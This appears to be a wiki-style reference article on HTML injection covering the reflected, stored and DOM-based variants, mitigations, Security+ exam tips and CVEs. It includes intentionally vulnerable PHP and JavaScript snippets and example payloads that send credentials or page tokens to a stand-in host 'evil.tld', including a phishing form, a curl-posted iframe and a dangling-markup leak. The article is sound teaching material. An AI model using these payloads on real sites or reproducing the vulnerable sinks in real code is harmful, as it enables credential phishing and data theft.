```markdown
---
domain: "web-application-security"
tags: [injection, web-security, owasp, client-side, appsec, input-validation]
---
# HTML Injection

**HTML Injection** is a client-side web vulnerability in which an attacker supplies unsanitized **HTML markup** that a target application renders inside its HTTP response, causing the browser to treat attacker-controlled content as legitimate page structure. It is a close relative of [[Cross-Site Scripting]] (XSS) but is typically scoped to injecting inert HTML tags — headings, forms, iframes, images — rather than executing JavaScript, making it a powerful vector for **content spoofing**, **phishing**, and **defacement** even when strong anti-XSS controls are present. HTML Injection is catalogued under [[OWASP Top 10]] A03:2021 – Injection and is a foundational concept in [[Web Application Security]].

---

## Overview

HTML Injection occurs whenever user-controlled data is concatenated into an HTML response without proper context-aware encoding. Because web browsers parse HTML permissively — honoring tags, attributes, and entities wherever they appear — even fragments of markup reflected back onto a page can fundamentally alter the document's structure. An injected `<h1>` becomes a heading, an injected `<form>` creates a new input surface pointing anywhere the attacker chooses, and an injected `<iframe>` can frame external content beneath the site's own origin and TLS certificate. The vulnerability is as old as dynamic web applications themselves and remains a fixture in modern bug-bounty programs and penetration test findings.

Two fundamental flavors exist. **Reflected HTML Injection** echoes a payload from the current HTTP request — a search term, an error message, a username — and is typically delivered via a crafted URL or form submission sent to the victim through email or social engineering. The malicious markup is never stored; it lives only in the response triggered by the victim's request. **Stored (Persistent) HTML Injection** persists the payload in a datastore — a comment system, a profile field, a support ticket — so that every subsequent viewer who loads that record renders the attacker's markup without any further interaction from the attacker. A third variant, **DOM-based HTML Injection**, arises when client-side JavaScript reads untrusted values and writes them into the DOM using dangerous sinks such as `innerHTML`, `document.write()`, or `insertAdjacentHTML()`, bypassing the server entirely and often evading server-side WAFs and logs.

Although HTML Injection is sometimes dismissed as "XSS without scripts," its business impact is frequently severe. An attacker who cannot execute JavaScript — because a strict [[Content Security Policy]] blocks inline scripts, or because a WAF strips `<script>` tags — can still forge a convincing login form that posts credentials to an external host, overlay the page with a fake "session expired" dialog, or permanently deface a public page. In regulated industries such as finance or healthcare, content spoofing that facilitates phishing of users is treated with the same legal and reputational severity as remote code execution.

HTML Injection persists in the wild for several structural reasons. Modern frameworks like React, Angular, and Django template engines escape output by default, which has dramatically reduced naïve reflected injection. However, developers routinely opt out of auto-escaping when they want to render rich text: React's `dangerouslySetInnerHTML`, Handlebars' triple-stache `{{{ }}}`, Jinja2's `| safe` filter, and Razor's `@Html.Raw()` all disable escaping on demand. Rich-text editors, Markdown processors, WYSIWYG comment systems, and email-template builders are chronic sources because their very purpose is to render user-supplied HTML. Every such exemption is a potential injection point.

Real-world incidents span the spectrum of web software. Stored HTML injection flaws have been disclosed in WordPress plugins (Contact Form 7, WPBakery, Elementor), Atlassian products, Joomla!, numerous ticketing and helpdesk platforms, and countless custom-built applications. Bug bounty programs on platforms like HackerOne and Bugcrowd routinely pay medium-to-high severity rewards for HTML injection vulnerabilities that enable phishing of administrator accounts or reputational damage against customer-facing pages.

---

## How It Works

At its core, HTML Injection exploits a **trust boundary violation**: data that has crossed from an untrusted source (an HTTP request parameter, a database row populated by a user) is concatenated into an HTML document without being converted back into safe text. The browser then parses the concatenated output and honors the injected tags as structure.

### Reflected HTML Injection — Server-Side

Consider a vulnerable PHP search endpoint served over HTTPS (port 443):

```php
<?php
// search.php — VULNERABLE: no output encoding
$q = $_GET['q'];
echo "<p>You searched for: $q</p>";
```

A legitimate request and its response:

```
GET /search.php?q=puppies HTTP/1.1
Host: example.test
```

```html
<p>You searched for: puppies</p>
```

An attacker crafts a URL that injects a phishing form:

```
GET /search.php?q=<h1>Site+Offline+%E2%80%94+Maintenance</h1>
<form+action="https://evil.tld/steal"+method="POST">
  <label>Re-enter+your+password:<input+name="p"+type="password"></label>
  <button+type="submit">Continue</button>
</form> HTTP/1.1
```

Because `$q` is interpolated verbatim, the server response becomes:

```html
<p>You searched for:
  <h1>Site Offline — Maintenance</h1>
  <form action="https://evil.tld/steal" method="POST">
    <label>Re-enter your password:
      <input name="p" type="password">
    </label>
    <button type="submit">Continue</button>
  </form>
</p>
```

The victim, who received the crafted link in a phishing email appearing to come from the legitimate organization, sees a plausible password prompt served from the real domain `example.test` with a valid TLS certificate — defeating the most common user security advice ("check the padlock").

### Stored HTML Injection

The same payload is POSTed into a persistent field via a forum comment API:

```bash
curl -X POST https://forum.example.test/api/comments \
     -H "Content-Type: application/json" \
     -b "session=abc123" \
     -d '{
       "thread_id": 42,
       "body": "<iframe src=\"https://evil.tld/fake-login\" width=\"100%\" height=\"600\" frameborder=\"0\"></iframe>"
     }'
```

Every user who subsequently loads thread 42 renders the attacker's iframe, without any further URL delivery required.

### DOM-Based HTML Injection

No server round-trip occurs. The sink is in client JavaScript:

```javascript
// app.js — VULNERABLE
// Reads a name from the URL fragment and writes it into the page
const name = decodeURIComponent(window.location.hash.slice(1));
document.getElementById('greeting').innerHTML = "Welcome back, " + name;
```

Visiting `https://app.example.test/#<img src=x onerror=alert(1)>` or, for script-less impact, `https://app.example.test/#<form action=https://evil.tld/steal><input type=password name=p></form>` causes the browser to build the malicious DOM with no server interaction — invisible to server-side WAFs and access logs.

### Key Payload Primitives

| Tag / Technique | Abuse Case |
|---|---|
| `<h1>`, `<p>`, `<div>` | Page defacement, fake notifications |
| `<form action="...">` | Credential phishing to external host |
| `<iframe src="...">` | Embedding external content under legitimate origin |
| `<base href="...">` | Hijacking all relative links and resource loads |
| `<meta http-equiv="refresh">` | Forced redirect to attacker site |
| `<link rel="stylesheet" href="...">` | External CSS injection for UI spoofing |
| `<style>` with attribute selectors | CSS-based data exfiltration (no JavaScript) |
| Dangling markup | Exfiltrate page content via unclosed attributes |

### Dangling Markup

When angle brackets are filtered but quotes are not, attackers exploit unterminated HTML attributes to exfiltrate DOM content. A payload like:

```html
"><img src="https://evil.tld/log?data=
```

causes the browser's HTML parser to treat everything up to the next `"` as the value of the `src` attribute, potentially including CSRF tokens or session identifiers that appear later in the page source — all transmitted to the attacker's server as a URL parameter.

---

## Key Concepts

- **Output Encoding (Contextual Escaping):** The process of converting characters that carry meaning in HTML — `<`, `>`, `&`, `"`, `'` — into their HTML entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`) appropriate to the rendering context (HTML body, attribute value, JavaScript string, URL, CSS). This is the single most authoritative defense against HTML Injection.
- **Reflected vs. Stored vs. DOM-Based:** Reflected attacks require socially engineering a victim into requesting a crafted URL; stored attacks fire automatically for any user who views the affected record; DOM-based attacks occur entirely in the browser and often bypass server-side controls and logging.
- **Content Spoofing:** The use of injected HTML to create fake interface elements — login forms, error dialogs, announcements — indistinguishable from legitimate site content. The primary business impact of script-less HTML Injection, enabling phishing from a trusted origin.
- **Dangling Markup Injection:** A bypass technique used when angle brackets are filtered. By injecting an unclosed HTML attribute (`"`), the attacker causes the browser to include subsequent page content (including tokens and secrets) in the value of an injected `src`, `href`, or `background` attribute, exfiltrating it via an HTTP request.
- **Sink vs. Source (Taint Analysis):** The **source** is where untrusted input enters the application (URL parameter, form field, cookie, `localStorage`, WebSocket message). The **sink** is where it is rendered into the document (`innerHTML`, `document.write`, template interpolation). Injection vulnerabilities exist on every path from an unvalidated source to a dangerous sink.
- **Allowlist vs. Denylist Sanitization:** Allowlist approaches (permit only explicitly approved tags and attributes, as DOMPurify does) are robust because all unknown constructs are rejected by default. Denylist approaches (block `<script>`, `onerror`, etc.) are routinely bypassed by HTML parser quirks, encoding tricks, and mutation XSS.
- **Mutation XSS (mXSS):** A class of bypass in which a browser's HTML parser *rewrites* sanitized markup — discarding the sanitizer's transformations — and reconstructs it in a dangerous form. Underscores why complex sanitizers must be tested against real browser parsers, not just regex.

---

## Exam Relevance

On the **Security+ SY0-701** exam, HTML Injection is not always named explicitly but is tested across multiple domains and question types. Understanding these nuances separates candidates who merely recognize the term from those who can answer scenario-based questions correctly.

**Domain mapping:**
- **2.3 – Indicators of Malicious Activity:** Injection attacks are a named category. Know that the family includes SQL injection, XML injection, LDAP injection, command injection, and HTML/script injection. Scenario questions may describe a symptom (attacker content appears on a page) and ask you to identify the attack type.
- **4.1 – Application Security:** Expect to pair attacks with controls. Input validation, output encoding, WAFs, SAST/DAST, and CSP are all valid mitigations for injection-class vulnerabilities.

**Common question patterns:**
- A scenario describes a user who clicks a link and sees a fake login form on a legitimate website. The question asks for the attack type → **HTML Injection** or **Reflected XSS** (both may be valid choices; pick the most specific one offered).
- A scenario says an attacker posted content in a forum that every visitor now sees → **Stored/Persistent HTML Injection** or **Stored XSS**.
- "Which control BEST prevents HTML injection?" → **Input validation** (exam-favored answer) or **output encoding** (technically most precise). If both appear, prefer output encoding; if neither appears, choose input validation.

**Gotchas:**
- **HTML Injection ≠ XSS strictly:** If the scenario describes markup injection *without script execution*, HTML Injection is the precise term; XSS is the superset. Know when each applies.
- **HTML Injection ≠ CSRF:** CSRF exploits an authenticated user's session to cause *server-side state changes*. HTML Injection corrupts *what content the victim sees*. Do not confuse these in elimination questions.
- **CSP is a mitigating, not preventive, control:** CSP can block the *impact* of an injection (e.g., prevent an injected form from submitting to an external host) but does not prevent the markup from being injected. Output encoding prevents the root cause.
- The exam may present "sanitization" and "encoding" as synonyms — in practice they are distinct (sanitization removes dangerous content; encoding transforms it). Both are acceptable SY0-701 answers for "how to prevent injection."

---

## Security Implications

HTML Injection's threat surface extends well beyond cosmetic defacement:

**Credential phishing on-origin.** Forged login or payment forms rendered under the legitimate domain and a valid TLS certificate defeat the most common user guidance ("look for HTTPS and check the URL"). Because the form is served from the real origin, the browser will autofill saved credentials, and the user's password manager will not warn about a suspicious domain.

**Base-tag hijacking.** An injected `<base href="https://evil.tld/">` causes every relative URL on the page — CSS, JavaScript, form actions, links — to resolve against the attacker's host. A single HTML injection can escalate to full script execution if any relative `<script src="...">` exists on the page.

**CSS-based data exfiltration.** An injected `<style>` block using CSS attribute selectors and `background-image: url(...)` can exfiltrate CSRF tokens, hidden field values, and even portions of page text to an attacker-controlled server — entirely without JavaScript, bypassing strict CSP `script-src` policies.

**Clickjacking / UI redress augmentation.** Injected `<iframe>` elements or absolutely positioned `<div>` overlays can obscure legitimate controls and redirect clicks.

**SEO poisoning and reputational damage.** Injected text content modifies the page as indexed by search crawlers, inserting spam keywords or defamatory statements under the target's domain.

**Notable CVEs and incidents:**
- **CVE-2019-8449 / CVE-2019-11581 (Atlassian Jira)** — A class of injection and information-disclosure issues in Jira Server where user-supplied fields were reflected without adequate encoding, enabling content spoofing.
- **CVE-2015-8562 (Joomla!)** — Remote code execution via object injection; related stored HTML/script injection issues plagued Joomla's comment and user-profile subsystems across multiple CVEs.
- **CVE-2022-21663 (WordPress core)** — Stored XSS/HTML injection via post slugs requiring contributor privileges, demonstrating how injections appear even in mature, widely audited codebases.
- **Numerous WordPress plugin advisories** (Contact Form 7, Elementor, WPBakery, Gravity Forms) document stored HTML injection in user-supplied form fields rendered on the front end.

**Detection approaches:**
- **DAST scanning** (OWASP ZAP, Burp Suite Pro, Acunetix) with HTML injection payloads in all input fields.
- **SAST** (Semgrep rules, CodeQL, SonarQube) flagging dangerous sinks: `innerHTML`, `dangerouslySetInnerHTML`, `Html.Raw`, `| safe`, `insertAdjacentHTML`.
- **WAF log analysis** — spikes in requests containing `<`, `>`, `"`, tag names, or URL-encoded equivalents in parameter values.
- **CSP violation reports** (`report-uri` / `report-to` directives) — fire when blocked inline scripts or external resources are triggered by injection payloads.